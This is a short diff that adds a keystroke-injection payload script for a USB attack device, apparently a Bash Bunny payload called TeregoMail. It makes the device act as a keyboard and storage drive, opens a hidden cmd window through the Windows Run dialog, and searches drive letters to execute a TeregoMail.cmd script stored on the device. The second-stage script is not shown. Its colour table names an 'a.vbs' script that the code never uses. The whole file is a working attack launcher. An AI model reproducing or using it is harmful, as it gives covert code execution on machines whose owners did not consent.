@@ -1,0 +1,31 @@
+#!/bin/bash
+
+# Colors:
+
+# | Status     | Color                         | Description                                      |
+# | ---------- | ------------------------------| ------------------------------------------------ |
+# | SETUP      | Magenta solid                 | Setting attack mode, getting the switch position | 
+# | FAIL       | Red slow blink                | Could not find the a.vbs script                  | 
+# | ATTACK     | Yellow single blink           | Running the Script                             | 
+# | FINISH     | Green blink followed by SOLID | Script is finished                               | 
+
+# Magenta solid
+LED SETUP
+
+# Set the attack mode
+ATTACKMODE HID STORAGE
+
+# Get the switch position
+GET SWITCH_POSITION
+
+# Start the attack - yellow single blink
+LED ATTACK
+
+QUACK DELAY 200
+RUN WIN 'cmd /q /t:08 /c "for %a in (d,e,f,g,h,i,j,k,l) do if exist %a:\payloads\library\TeregoMail\scripts\TeregoMail.cmd %a:\payloads\library\TeregoMail\scripts\TeregoMail.cmd & exit"'
+
+
+
+QUACK ENTER
+QUACK DELAY 4000
+LED FINISH
